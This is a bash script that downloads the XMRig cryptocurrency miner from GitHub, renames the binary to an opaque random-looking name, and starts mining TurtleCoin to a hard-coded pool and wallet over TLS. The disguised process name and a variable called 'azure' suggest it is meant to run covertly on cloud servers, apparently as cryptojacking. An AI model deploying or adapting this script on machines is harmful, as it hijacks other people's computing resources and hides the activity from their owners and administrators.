#!/bin/bash
sudo apt-get update
VERSION=6.3.1
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
mkdir -p /usr/share
mkdir -p /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=us.turtlecoin.herominers.com:1160
USERNAME=TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+11bf5aac924fdb97faaa8fea90a64096c7541735d89c0952970ede1bdf08ed2e
ALGO=argon2/chukwav2
DONATE=1
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.T67Test -p Sep14 -a $ALGO -k --tls
